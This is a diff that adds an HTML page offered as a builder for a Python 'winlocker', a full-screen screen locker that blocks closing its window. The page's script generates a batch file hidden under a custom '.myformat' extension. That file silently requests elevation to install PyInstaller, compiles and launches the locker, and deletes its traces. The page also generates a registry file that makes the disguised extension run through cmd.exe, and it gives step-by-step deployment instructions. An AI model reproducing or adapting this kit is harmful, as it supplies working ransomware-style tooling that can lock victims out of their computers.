@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Create .myformat Executable</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        textarea { width: 100%; height: 200px; }
+        button { padding: 10px 20px; margin: 10px 0; }
+        .container { max-width: 800px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Create .myformat Executable File</h2>
+        
+        <p>Enter your Python winlocker code:</p>
+        <textarea id="code">import tkinter as tk
+from tkinter import messagebox
+import os
+import sys
+
+password = "123"
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.attributes('-topmost', True)
+root.configure(bg='black')
+
+label = tk.Label(root, text="SYSTEM LOCKED\\nPassword: 123", 
+                 font=('Arial', 20), fg='red', bg='black')
+label.pack(pady=50)
+
+entry = tk.Entry(root, show='*', font=('Arial', 16))
+entry.pack(pady=20)
+entry.focus()
+
+def check_password():
+    if entry.get() == password:
+        root.destroy()
+    else:
+        messagebox.showerror("Error", "Incorrect password!")
+        entry.delete(0, tk.END)
+
+button = tk.Button(root, text="UNLOCK", font=('Arial', 16), 
+                   command=check_password, bg='red', fg='white')
+button.pack(pady=10)
+
+root.bind('<Return>', lambda event: check_password())
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+root.mainloop()</textarea>
+        
+        <p>Filename:</p>
+        <input type="text" id="filename" value="system_file" style="width: 300px;">
+        
+        <br>
+        <button onclick="createMyFormat()">Create .myformat File</button>
+        
+        <script>
+            function createMyFormat() {
+                const code = document.getElementById('code').value;
+                const basename = document.getElementById('filename').value.replace('.myformat', '');
+                
+                // Create the .myformat file that contains both Python and Batch commands
+                const myformatContent = `@echo off
+REM This .myformat file executes like an EXE
+echo Checking system requirements...
+python --version >nul 2>&1
+if errorlevel 1 (
+    echo Python not found. Installing...
+    powershell -Command "Start-Process cmd -ArgumentList '/c pip install pyinstaller' -Verb RunAs -WindowStyle Hidden"
+    timeout 3 >nul
+)
+
+echo Creating temporary script...
+echo import tkinter as tk > %~dp0temp_winlocker.py
+echo from tkinter import messagebox >> %~dp0temp_winlocker.py
+echo import os >> %~dp0temp_winlocker.py
+echo import sys >> %~dp0temp_winlocker.py
+echo import subprocess >> %~dp0temp_winlocker.py
+${code.split('\n').map(line => `echo ${line} >> %~dp0temp_winlocker.py`).join('\n')}
+
+echo Compiling to executable...
+pyinstaller --onefile --noconsole %~dp0temp_winlocker.py >nul 2>&1
+
+echo Executing lock screen...
+start "" "%~dp0dist\\\\temp_winlocker.exe"
+
+echo Cleaning up...
+del %~dp0temp_winlocker.py >nul 2>&1
+rmdir /s /q %~dp0build >null 2>&1
+del %~dp0temp_winlocker.spec >nul 2>&1
+
+exit
+`;
+                
+                // Download .myformat file
+                const blob = new Blob([myformatContent], { type: 'application/bat' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = basename + '.myformat';
+                link.click();
+                
+                // Create registry file to associate .myformat with cmd.exe
+                createRegistryFile(basename);
+            }
+            
+            function createRegistryFile(basename) {
+                const regContent = `Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\\.myformat]
+@="MyFormatFile"
+
+[HKEY_CLASSES_ROOT\\MyFormatFile\\shell\\open\\command]
+@="cmd.exe /c \"\"%1\"\""
+
+[HKEY_CURRENT_USER\\Software\\Classes\\.myformat]
+@="MyFormatFile"
+
+[HKEY_CURRENT_USER\\Software\\Classes\\MyFormatFile\\shell\\open\\command]
+@="cmd.exe /c \"\"%1\"\""
+`;
+                
+                const regBlob = new Blob([regContent], { type: 'text/plain' });
+                const regLink = document.createElement('a');
+                regLink.href = URL.createObjectURL(regBlob);
+                regLink.download = 'associate_myformat.reg';
+                regLink.click();
+                
+                setTimeout(() => {
+                    alert('Two files downloaded:\\n1. ' + basename + '.myformat - The executable file\\n2. associate_myformat.reg - Registry association\\n\\nFIRST: Double-click associate_myformat.reg to associate .myformat files\\nTHEN: Double-click ' + basename + '.myformat to run the winlocker');
+                }, 500);
+            }
+        </script>
+
+        <h3>How to Use:</h3>
+        <ol>
+            <li>Click "Create .myformat File" - two files download</li>
+            <li>First, double-click <code>associate_myformat.reg</code> and click Yes</li>
+            <li>Then, double-click the <code>.myformat</code> file</li>
+            <li>It will compile and run the winlocker automatically</li>
+        </ol>
+
+        <h3>What happens when .myformat is clicked:</h3>
+        <ul>
+            <li>Checks if Python is installed</li>
+            <li>Creates temporary Python script</li>
+            <li>Compiles it to EXE using PyInstaller</li>
+            <li>Runs the compiled winlocker EXE</li>
+            <li>Cleans up temporary files</li>
+            <li>System locks with password "123"</li>
+        </ul>
+    </div>
+</body>
+</html>
